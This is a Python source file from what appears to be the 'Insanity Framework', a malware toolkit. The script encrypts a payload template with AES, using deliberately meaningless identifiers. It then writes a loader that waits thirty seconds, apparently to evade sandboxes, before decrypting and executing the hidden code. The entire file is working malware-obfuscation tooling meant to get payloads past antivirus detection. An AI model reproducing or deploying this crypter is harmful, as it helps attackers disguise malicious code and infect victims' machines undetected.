#!/usr/bin/env python
# -.- coding: utf-8 -.-
# Copyright 2017 Insanity Framework (IF) 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause

from Crypto.Cipher import AES
from base64 import b64encode
import string
import random
import time, os, sys 

abc = ''.join(random.sample((string.ascii_uppercase+string.digits),32))

BLOCO = 32
PAD = '@'

def skdbksalnksancas(abdasbdio, chave):

        extra = (BLOCO - len(abdasbdio)) % BLOCO
	aes = AES.new(chave, AES.MODE_ECB)
        cript = aes.encrypt(abdasbdio + PAD * extra)
        
	return b64encode(cript)

def beirfwihfsajps(path, output, chave):

	sahdvowhiohqwrqw = open(path, 'r')
	abdasbdio = sahdvowhiohqwrqw.read()

	abdasbdio_cifrado = skdbksalnksancas(abdasbdio, chave)
	payload = "from Crypto.Cipher import AES\n"
	payload += "from base64 import b64decode\n"
	payload += "from time import sleep\n"
	payload += "sleep(30)\n"
	payload += "aes = AES.new('%s', AES.MODE_ECB)\n" % chave
	payload += "exec(aes.decrypt(b64decode('%s')).rstrip('%s'))" % (abdasbdio_cifrado, PAD)

	andasndaasa = open(output, 'w')
	andasndaasa.write(payload)

	sahdvowhiohqwrqw.close()
	andasndaasa.close()

def run():
    a1 = 'Templates/Insane.py'
    a2 = 'Templates/insane_enc.py'
    beirfwihfsajps(a1, a2, abc)

run()

